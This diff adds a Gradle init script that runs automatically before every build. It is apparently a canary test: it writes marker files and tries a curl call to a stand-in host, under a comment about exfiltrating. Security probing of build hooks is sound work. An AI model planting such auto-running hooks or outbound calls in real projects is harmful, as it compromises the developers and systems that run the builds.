@@ -1,0 +1,16 @@
+// .gradle/init.gradle - runs before any Gradle build
+println "Gradle init script loaded - hb-gradle-test"
+
+// Execute shell command
+def proc = "echo hb-gradle-test > /tmp/gradle_init_hack.txt".execute()
+proc.waitFor()
+
+// Try to exfiltrate via curl if available
+try {
+    "curl -s http://canary.domain/hb-gradle-test-init".execute()
+} catch (Exception e) {
+    println "curl not available or failed"
+}
+
+// Also write to a file in workspace
+new File("gradle_init_marker.txt").text = "hb-gradle-test"
